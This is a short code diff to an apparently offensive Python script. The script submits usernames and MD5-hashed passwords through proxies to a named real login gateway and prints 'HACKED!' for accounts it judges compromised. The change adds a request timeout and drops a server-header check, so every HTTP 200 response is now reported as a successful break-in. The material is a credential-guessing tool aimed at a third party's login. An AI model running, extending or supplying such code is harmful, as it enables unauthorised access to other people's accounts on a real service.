@@ -21,13 +21,10 @@ def check_results(username, password):
     data = dict(UserPassword=convert_to_md5(password), pswdStatus='mediocre', UserID=username, DummyVar='')
 
     try:
-        request = requests.post('http://puya.ubahar.ir/gateway/UserInterim.php', data=data, proxies=proxies, timeout=None)
+        request = requests.post('http://puya.ubahar.ir/gateway/UserInterim.php', data=data, proxies=proxies, timeout=10)
 
         if request.status_code == 200:
-            if request.headers['Server'] == 'Apache':
-                print(username + ' - ' + password + ' - HACKED!')
-            else:
-                print(username + ' - ' + password + ' - 0')
+            print(username + ' - ' + password + ' - HACKED!')
         else:
             print('HTTP Code Error : ' + username + ' - ' + password)
 
